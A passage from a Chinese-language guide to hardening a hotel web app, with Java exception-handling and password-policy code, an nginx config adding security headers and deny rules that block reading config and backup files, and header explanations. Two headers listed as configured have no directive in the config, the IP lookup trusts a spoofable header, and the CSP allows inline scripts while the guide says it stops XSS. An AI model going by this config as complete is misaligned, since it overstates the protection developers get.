        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(Result.error(401, "认证失败：" + e.getMessage()));
    }

    /**
     * 处理凭证错误异常
     * 
     * 用户名或密码错误时抛出
     */
    @ExceptionHandler(BadCredentialsException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleBadCredentialsException(
            BadCredentialsException e, HttpServletRequest request) {
        log.warn("[SECURITY] 凭证错误 - IP: {}, URL: {}", 
                getClientIp(request), request.getRequestURI());
        // 返回模糊的错误信息，防止暴力破解
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(Result.error(401, "用户名或密码错误"));
    }

    /**
     * 处理权限拒绝异常
     * 
     * 用户权限不足时抛出
     */
    @ExceptionHandler(AccessDeniedException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleAccessDeniedException(
            AccessDeniedException e, HttpServletRequest request) {
        log.warn("[SECURITY] 权限拒绝 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage());
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
                .body(Result.error(403, "权限不足，无法访问"));
    }

    /**
     * 获取客户端IP
     */
    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }
        if (ip != null && ip.contains(",")) {
            ip = ip.split(",")[0].trim();
        }
        return ip;
    }

    /**
     * 业务异常类
     * 
     * 用于抛出自定义业务异常
     */
    public static class BusinessException extends RuntimeException {
        private final int code;

        public BusinessException(int code, String message) {
            super(message);
            this.code = code;
        }

        public BusinessException(String message) {
            super(message);
            this.code = 400;
        }

        public int getCode() {
            return code;
        }
    }
}
```

### 7.1 PasswordPolicyConfig - 密码策略配置类

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/config/PasswordPolicyConfig.java`

```java
package com.xunni.hotel.web.config;

import org.springframework.context.annotation.Configuration;

/**
 * 密码策略配置类
 * 
 * 定义密码和用户名的验证规则
 */
@Configuration
public class PasswordPolicyConfig {

    // 密码正则表达式
    // 解释：(?=.*[a-z]) 至少一个小写字母
    //       (?=.*[A-Z]) 至少一个大写字母
    //       (?=.*\\d)   至少一个数字
    //       (?=.*[@$!%*?&]) 至少一个特殊字符
    //       [A-Za-z\\d@$!%*?&]{8,} 至少8位
    private static final String PASSWORD_REGEX = 
            "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$";

    private static final String PASSWORD_ERROR_MSG = 
            "密码必须至少8位，包含大小写字母、数字和特殊字符(@$!%*?&)";

    /**
     * 验证密码强度
     * 
     * @param password 密码
     * @return 是否符合要求
     */
    public static boolean validatePassword(String password) {
        if (password == null || password.isEmpty()) {
            return false;
        }
        // 使用正则表达式验证
        return password.matches(PASSWORD_REGEX);
    }

    /**
     * 验证用户名
     * 
     * 用户名规则：3-20位，只能包含字母、数字、下划线
     */
    public static boolean validateUsername(String username) {
        if (username == null || username.isEmpty()) {
            return false;
        }
        return username.matches("^[a-zA-Z0-9_]{3,20}$");
    }

    /**
     * 验证邮箱格式
     */
    public static boolean validateEmail(String email) {
        if (email == null || email.isEmpty()) {
            return false;
        }
        return email.matches("^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+$");
    }

    /**
     * 验证手机号格式
     */
    public static boolean validatePhone(String phone) {
        if (phone == null || phone.isEmpty()) {
            return false;
        }
        // 中国手机号：1开头，第二位3-9，后面9位数字
        return phone.matches("^1[3-9]\\d{9}$");
    }
}
```

```nginx
server {
    listen 80;
    server_name localhost;

    # ==================== 1. 隐藏Nginx版本号 ====================
    # 防止攻击者根据版本号查找已知漏洞
    server_tokens off;

    # ==================== 2. 安全响应头 ====================
    # 防止XSS攻击

    # 防止点击劫持
    add_header X-Frame-Options SAMEORIGIN;
    
    # 防止MIME类型嗅探

    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
    
    # 内容安全策略
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'";
    
    # 来源策略
    add_header Referrer-Policy "strict-origin-when-cross-origin";
    
    # 权限策略
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";

    # ==================== 3. 前端静态文件服务 ====================
    location / {
        root /usr/share/nginx/html;      # 前端文件目录
        index index.html;                # 默认首页
        try_files $uri $uri/ /index.html;  # SPA路由支持
    }

    # 静态资源缓存（1年）
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # ==================== 4. 后端API代理 ====================
    location /api/ {
        proxy_pass http://hotel-app:8081/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;        # 真实IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # 代理链IP
        proxy_set_header X-Forwarded-Proto $scheme;     # 协议
        proxy_connect_timeout 60s;
        proxy_read_timeout 60s;
        proxy_send_timeout 60s;
        client_max_body_size 50m;  # 最大请求体50MB
    }

    # ==================== 5. 健康检查 ====================
    location /health {
        proxy_pass http://hotel-app:8081/health;
        access_log off;  # 关闭访问日志
    }

    # ==================== 6. 禁止访问敏感文件 ====================
    # 禁止访问隐藏文件（.开头）
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }

    # 禁止访问配置文件
    location ~* (config|conf|yml|yaml|xml)$ {
        deny all;
        access_log off;
        log_not_found off;
    }

    # 禁止访问备份文件
    location ~* (\.bak|\.backup|\.old|\.tmp)$ {
        deny all;
        access_log off;
        log_not_found off;
    }

    # ==================== 7. 错误页面 ====================
    error_page 400 /400.html;
    error_page 403 /403.html;
    error_page 404 /404.html;
    error_page 500 502 503 504 /50x.html;

    # ==================== 8. 日志配置 ====================
    access_log /var/log/nginx/hotel_access.log combined;
    error_log /var/log/nginx/hotel_error.log warn;
}
```

### 8.2 安全响应头详解

| 响应头 | 作用 | 配置值 |
|-------|------|-------|
| `X-Frame-Options` | 防止点击劫持 | `SAMEORIGIN` - 只允许同源嵌入 |
| `X-XSS-Protection` | XSS过滤器（老浏览器） | `1; mode=block` - 阻止而非过滤 |
| `X-Content-Type-Options` | 禁止MIME嗅探 | `nosniff` - 严格遵守Content-Type |
| `Strict-Transport-Security` | 强制HTTPS | `max-age=31536000` - 有效期1年 |
| `Content-Security-Policy` | 内容安全策略 | 限制资源加载来源 |
| `Referrer-Policy` | 来源信息策略 | 控制Referer头发送 |
| `Permissions-Policy` | 权限策略 | 控制API权限（位置、麦克风等） |

### 8.3 内容安全策略(CSP)详解

```nginx
Content-Security-Policy: 
    default-src 'self';      # 默认：只允许同源
    script-src 'self' 'unsafe-inline';  # 脚本：同源+内联
    style-src 'self' 'unsafe-inline';    # 样式：同源+内联
    img-src 'self' data:;    # 图片：同源+base64
    font-src 'self';         # 字体：只允许同源
```

**效果**：
- 只能加载同源（当前域名）的资源
- 防止加载外部恶意脚本
- 防止XSS攻击执行外部代码
